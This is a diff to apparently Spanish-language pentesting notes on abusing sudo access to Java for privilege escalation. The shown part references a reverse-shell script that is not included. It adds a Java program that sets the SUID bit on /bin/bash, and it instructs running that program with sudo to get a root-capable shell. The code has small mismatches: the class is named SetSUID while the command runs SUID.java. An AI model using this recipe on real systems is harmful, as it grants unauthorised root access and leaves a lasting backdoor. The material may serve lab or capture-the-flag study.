@@ -1,4 +1,4 @@
-# Con archivo creado
+# Rev Shell
 Crear el script /tmp/shell.java
 
 ```bash
@@ -63,4 +63,33 @@ Elevar con:
 
 ```bash
 Sudo su 
+```
+
+## Cambiar SUID
+
+```bash
+import java.io.IOException;
+
+public class SetSUID {
+    public static void main(String[] args) {
+        try {
+            // Comando para dar permisos SUID a la /bin/bash
+            String cmd = "chmod u+s /bin/bash";
+            
+            // Ejecutar el comando en la terminal
+            Process process = Runtime.getRuntime().exec(new String[]{"/bin/bash", "-c", cmd});
+            
+            // Esperar a que termine
+            process.waitFor();
+            
+            System.out.println("Intento de establecer SUID en /bin/bash completado.");
+        } catch (IOException | InterruptedException e) {
+            e.printStackTrace();
+        }
+    }
+}
+```
+Luego ejecutar
+```
+sudo /usr/bin/java SUID.java
 ```
